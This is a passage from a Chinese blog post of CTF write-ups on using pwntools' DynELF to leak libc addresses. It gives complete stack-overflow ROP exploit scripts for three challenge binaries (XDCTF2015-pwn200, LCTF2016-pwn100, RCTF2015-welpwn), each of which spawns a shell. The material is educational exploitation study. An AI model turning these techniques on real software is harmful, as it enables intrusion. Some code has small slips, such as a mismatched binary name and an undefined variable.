+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">  count = 0</span><br><span class="line">  data = &quot;&quot;</span><br><span class="line">  payload = xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  print p.recvuntil(&quot;xxx\n&quot;)) #一定要在puts前释放完输出</span><br><span class="line">  up = &quot;&quot;</span><br><span class="line">  while True:</span><br><span class="line">    c = p.recv(1)</span><br><span class="line">    count += 1</span><br><span class="line">    if up == &#x27;\n&#x27; and c == &quot;x&quot;:  #一定要找到泄漏信息的字符串特征</span><br><span class="line">      data = buf[:-1]                     </span><br><span class="line">      data += &quot;\x00&quot;</span><br><span class="line">      break</span><br><span class="line">    else:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:4] </span><br><span class="line">  log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span><br><span class="line">  return data</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他需要注意的地址"><a href="#其他需要注意的地址" class="headerlink" title="其他需要注意的地址"></a>其他需要注意的地址</h2><p>在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的 _start 函数来重新开始程序以恢复栈。</p>
+<h2 id="XDCTF2015-pwn200"><a href="#XDCTF2015-pwn200" class="headerlink" title="XDCTF2015-pwn200"></a>XDCTF2015-pwn200</h2><p>本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下 <strong>借助DynELF实现利用的要点：</strong></p>
+<ol>
+<li>调用 write 函数来泄露地址信息，比较方便；</li>
+<li>32 位 linux 下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；</li>
+<li>在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；</li>
+<li>在实际调用 system 前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</li>
+</ol>
+<p>接下来就直接给出利用代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">p = process(&quot;./xdctf-pwn200&quot;)</span><br><span class="line">elf = ELF(&quot;./xdctf-pwn200&quot;)</span><br><span class="line">writeplt = elf.symbols[&#x27;write&#x27;]</span><br><span class="line">writegot = elf.got[&#x27;write&#x27;]</span><br><span class="line">readplt = elf.symbols[&#x27;read&#x27;]</span><br><span class="line">readgot = elf.got[&#x27;read&#x27;]</span><br><span class="line">vulnaddress =  0x08048484 </span><br><span class="line">startaddress = 0x080483d0      #调用start函数，用以恢复栈</span><br><span class="line">bssaddress =   0x0804a020    #用来写入“/bin/sh\0”字符串</span><br><span class="line">def leak(address):</span><br><span class="line">  payload = &quot;A&quot; * 112</span><br><span class="line">  payload += p32(writeplt)</span><br><span class="line">  payload += p32(vulnaddress)</span><br><span class="line">  payload += p32(1)</span><br><span class="line">  payload += p32(address)</span><br><span class="line">  payload += p32(4)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  data = p.recv(4)</span><br><span class="line">  print &quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))</span><br><span class="line">  return data</span><br><span class="line">print p.recvline()</span><br><span class="line">dynelf = DynELF(leak, elf=ELF(&quot;./lctf-pwn200&quot;))</span><br><span class="line">systemAddress = dynelf.lookup(&quot;__libc_system&quot;, &quot;libc&quot;) </span><br><span class="line">print &quot;systemAddress:&quot;, hex(systemAddress)</span><br><span class="line">#调用_start函数，恢复栈</span><br><span class="line">payload1 = &quot;A&quot; * 112</span><br><span class="line">payload1 += p32(startaddress) </span><br><span class="line">p.send(payload1)</span><br><span class="line">print p.recv()</span><br><span class="line">ppprAddress = 0x0804856c  #获取到的连续3次pop操作的gadget的地址 </span><br><span class="line">payload1 = &quot;A&quot; * 112</span><br><span class="line">payload1 += p32(readplt)</span><br><span class="line">payload1 += p32(ppprAddress)</span><br><span class="line">payload1 += p32(0)</span><br><span class="line">payload1 += p32(bssaddress)</span><br><span class="line">payload1 += p32(8)</span><br><span class="line">payload1 += p32(systemAddress) + p32(vulnaddress) + p32(bssaddress)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(&#x27;/bin/sh\0&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="LCTF2016-pwn100"><a href="#LCTF2016-pwn100" class="headerlink" title="LCTF2016-pwn100"></a>LCTF2016-pwn100</h2><p>本题是64位 linux 下的二进制程序，无 cookie，也存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但和上一题相比，存在两处差异：</p>
+<ol>
+<li>64位 linux 下的函数需要通过 rop 链将参数传入寄存器，而不是依靠栈布局；</li>
+<li>puts 函数与write函数不同，不能指定输出字符串的长度。</li>
+</ol>
+<p>根据上文给出的解决方法，构造利用脚本如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">p = process(&quot;./pwn100&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn100&quot;)</span><br><span class="line">readplt = elf.symbols[&#x27;read&#x27;]</span><br><span class="line">readgot = elf.got[&#x27;read&#x27;]</span><br><span class="line">putsplt = elf.symbols[&#x27;puts&#x27;]</span><br><span class="line">putsgot = elf.got[&#x27;puts&#x27;]</span><br><span class="line">mainaddress =   0x4006b8</span><br><span class="line">startaddress =   0x400550</span><br><span class="line">poprdi =     0x400763</span><br><span class="line">pop6address  =  0x40075a   </span><br><span class="line">movcalladdress = 0x400740</span><br><span class="line">waddress =     0x601000 #可写的地址，bss段地址在我这里好像不行，所以选了一个别的地址，应该只要不是readonly的地址都可以 </span><br><span class="line">def leak(address):</span><br><span class="line">  count = 0</span><br><span class="line">  data = &#x27;&#x27;</span><br><span class="line">  payload = &quot;A&quot; * 64 + &quot;A&quot; * 8</span><br><span class="line">  payload += p64(poprdi) + p64(address)</span><br><span class="line">  payload += p64(putsplt)</span><br><span class="line">  payload += p64(startaddress)</span><br><span class="line">  payload = payload.ljust(200, &quot;B&quot;)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  print p.recvuntil(&#x27;bye~\n&#x27;)</span><br><span class="line">  up = &quot;&quot;</span><br><span class="line">  while True:</span><br><span class="line">    c = p.recv(numb=1, timeout=0.5)</span><br><span class="line">    count += 1</span><br><span class="line">    if up == &#x27;\n&#x27; and c == &quot;&quot;:</span><br><span class="line">      data = data[:-1]</span><br><span class="line">      data += &quot;\x00&quot;</span><br><span class="line">      break</span><br><span class="line">    else:</span><br><span class="line">      data += c</span><br><span class="line">    up = c</span><br><span class="line">  data = data[:4]</span><br><span class="line">  log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span><br><span class="line">  return data</span><br><span class="line">d = DynELF(leak, elf=ELF(&#x27;./pwn100&#x27;))</span><br><span class="line">systemAddress = d.lookup(&#x27;__libc_system&#x27;, &#x27;libc&#x27;)</span><br><span class="line">print &quot;systemAddress:&quot;, hex(systemAddress)</span><br><span class="line">print &quot;-----------write /bin/sh to bss--------------&quot;</span><br><span class="line">payload1 = &quot;A&quot; * 64 + &quot;A&quot; * 8</span><br><span class="line">payload1 += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(waddress) + p64(0)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += &#x27;\x00&#x27;*56</span><br><span class="line">payload1 += p64(startaddress)</span><br><span class="line">payload1 =  payload1.ljust(200, &quot;B&quot;)</span><br><span class="line">p.send(payload1)</span><br><span class="line">print p.recvuntil(&#x27;bye~\n&#x27;)</span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line">print &quot;-----------get shell--------------&quot;</span><br><span class="line">payload2 = &quot;A&quot; * 64 + &quot;A&quot; * 8</span><br><span class="line">payload2 += p64(poprdi) + p64(waddress)</span><br><span class="line">payload2 += p64(systemAddress)</span><br><span class="line">payload2 += p64(startaddress)</span><br><span class="line">payload2 =  payload2.ljust(200, &quot;B&quot;)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="RCTF2015-welpwn"><a href="#RCTF2015-welpwn" class="headerlink" title="RCTF2015-welpwn"></a>RCTF2015-welpwn</h2><p>本题也是 64 位 linux 下的二进制程序，无 cookie，也存在明显的栈溢出漏洞，且可以循环泄露，符合我们使用 DynELF 的条件，与其他两题的区别主要在于利用过程比较绕。</p>
+<p>整个程序逻辑是这样的，main 函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“\x00”作为字符串终止符，故如果我们的 payload 中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用gadget来为write函数传参，故肯定会在payload中包含“\x00”字符。</p>
+<p>这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节，故我们可以利用这一点，只复制过去24字节数据加上一个包含连续4个 pop 指令的 gadget 地址，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程，具体脚本如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">p = process(&quot;./welpwn&quot;)</span><br><span class="line">elf = ELF(&quot;welpwn&quot;)</span><br><span class="line">readplt = elf.symbols[&quot;read&quot;]</span><br><span class="line">readgot = elf.got[&quot;read&quot;]</span><br><span class="line">writeplt = elf.symbols[&quot;write&quot;]</span><br><span class="line">writegot = elf.got[&quot;write&quot;]</span><br><span class="line">startAddress =    0x400630</span><br><span class="line">popr12r13r14r15  = 0x40089c</span><br><span class="line">pop6address    = 0x40089a</span><br><span class="line">movcalladdress  = 0x400880</span><br><span class="line">def leak(address):</span><br><span class="line">  print p.recv(1024)</span><br><span class="line">  payload = &quot;A&quot; * 24</span><br><span class="line">  payload += p64(popr12r13r14r15)</span><br><span class="line">  payload += p64(pop6address) + p64(0) + p64(1) + p64(writegot) + p64(8) + p64(address) + p64(1)</span><br><span class="line">  payload += p64(movcalladdress)</span><br><span class="line">  payload += &quot;A&quot; * 56</span><br><span class="line">  payload += p64(startAddress)</span><br><span class="line">  payload =  payload.ljust(1024, &quot;C&quot;)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  data = p.recv(4)</span><br><span class="line">  print &quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))</span><br><span class="line">  return data</span><br><span class="line">dynelf = DynELF(leak, elf=ELF(&quot;./welpwn&quot;))</span><br><span class="line">systemAddress = dynelf.lookup(&quot;__libc_system&quot;, &quot;libc&quot;)</span><br><span class="line">print hex(systemAddress)</span><br><span class="line">bssAddress = 0x601070</span><br><span class="line">poprdi =     0x4008a3</span><br><span class="line">print p.recv(1024)</span><br><span class="line">payload = &quot;A&quot; * 24</span><br><span class="line">payload += p64(popr12r13r14r15)</span><br><span class="line">payload += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(bssAddress) + p64(0)</span><br><span class="line">payload += p64(movcalladdress)</span><br><span class="line">payload += &quot;A&quot; * 56</span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(bssAddress)</span><br><span class="line">payload += p64(systemAddress)</span><br><span class="line">payload = payload.ljust(1024, &quot;C&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>由于该题目程序中也包含 puts 函数，故我们也可以用 puts 函数来实现 leak，代码如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">  count = 0</span><br><span class="line">  data = &#x27;&#x27;</span><br><span class="line">  print p.recv(1024)</span><br><span class="line">  payload = &quot;A&quot; * 24</span><br><span class="line">  payload += p64(popr12r13r14r15)</span><br><span class="line">  payload += p64(poprdi) + p64(address)</span><br><span class="line">  payload += p64(putsplt)</span><br><span class="line">  payload += p64(startAddress)</span><br><span class="line">  payload = payload.ljust(1020, &quot;B&quot;)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  #由于echo函数最后会输出复制过去的字符串，而该字符串是popr12r13r14r15，故我们可以将该gadget的地址作为判断输出结束的依据</span><br><span class="line">  print p.recvuntil(&quot;\x9c\x08\x40&quot;) </span><br><span class="line">  up = &quot;&quot;</span><br><span class="line">  while True:</span><br><span class="line">    c = p.recv(1)</span><br><span class="line">    count += 1</span><br><span class="line">    if up == &#x27;\n&#x27; and c == &quot;W&quot;: #下一轮输出的首字母就是“Welcome”中的“W”</span><br><span class="line">      data = data[:-1]</span><br><span class="line">      data += &quot;\x00&quot;</span><br><span class="line">      break</span><br><span class="line">    else:</span><br><span class="line">      data += c</span><br><span class="line">    up = c</span><br><span class="line">  data = data[:4]</span><br><span class="line">  print &quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))</span><br><span class="line">  return data</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://klaus.link/2016/Python-Pwntools-DynELF%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/">Pwntools中的DynELF模块的使用</a></li>
+<li><a target="_blank" rel="noopener" href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html">Finding Function’s Load Address</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.cnblogs.com/Ox9A82/p/5487725.html">__libc_csu_init函数的通用gadget</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/09/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="prev" title="格式化字符串漏洞">
+      <i class="fa fa-chevron-left"></i> 格式化字符串漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/10/welpwn/" rel="next" title="welpwn">
+      welpwn <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF"><span class="nav-number">2.</span> <span class="nav-text">模板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B1%80%E9%99%90"><span class="nav-number">3.</span> <span class="nav-text">局限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-number">4.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">5.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E9%80%9A%E7%94%A8-Gadget"><span class="nav-number">7.</span> <span class="nav-text">一、通用 Gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DynELF"><span class="nav-number">8.</span> <span class="nav-text">DynELF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">9.</span> <span class="nav-text">使用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#write-%E5%87%BD%E6%95%B0"><span class="nav-number">10.</span> <span class="nav-text">write 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#puts-%E5%87%BD%E6%95%B0"><span class="nav-number">11.</span> <span class="nav-text">puts 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-number">12.</span> <span class="nav-text">其他需要注意的地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XDCTF2015-pwn200"><span class="nav-number">13.</span> <span class="nav-text">XDCTF2015-pwn200</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LCTF2016-pwn100"><span class="nav-number">14.</span> <span class="nav-text">LCTF2016-pwn100</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2015-welpwn"><span class="nav-number">15.</span> <span class="nav-text">RCTF2015-welpwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">16.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Dvgd"
+      src="/images/Dvgd.jpg">
+  <p class="site-author-name" itemprop="name">Dvgd</p>
+  <div class="site-description" itemprop="description">Welcome to my blog.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/yourname" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;yourname" rel="noopener" target="_blank"><i class="weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1861579836&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Dvgd</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+</body>
+</html>
+<!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+<script type="text/javascript" src="/js/snow2.js"></script>
+
+<!-- 樱花特效 -->
+  
+      <script async src="/js/fairyDustCursor.js"></script>
+  
+
+
